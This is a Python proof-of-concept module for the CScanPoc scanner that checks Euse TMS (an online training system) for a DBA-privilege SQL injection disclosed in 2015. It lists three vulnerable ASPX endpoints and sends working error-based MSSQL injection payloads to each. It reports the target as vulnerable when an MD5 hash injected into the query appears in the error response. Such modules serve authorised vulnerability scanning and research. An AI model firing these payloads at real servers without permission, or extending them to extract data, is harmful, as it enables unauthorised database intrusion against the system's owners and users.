# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Euse-TMS_0006'  # 平台漏洞编号，留空
    name = '益用在线培训系统存在 DBA权限SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-11-19'  # 漏洞公布时间
    desc = '''
        Euse TMS(益用在线培训系统)存在多处DBA权限SQL注入漏洞：
        /Knowledge/PersonalQuestionsList.aspx?userid=1and
        /Course/CourseCommentList.aspx?type=2and
        /Plan/plancommentlist.aspx?type=3and
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=135012'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Euse-TMS(益用在线培训系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '65c07aab-e8de-47fd-988c-d96440c42c3b'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/Knowledge/PersonalQuestionsList.aspx?userid=1and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--",
                "/Course/CourseCommentList.aspx?type=2and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&targetid=2",
                "/Plan/plancommentlist.aspx?type=3and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&targetid=1",
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
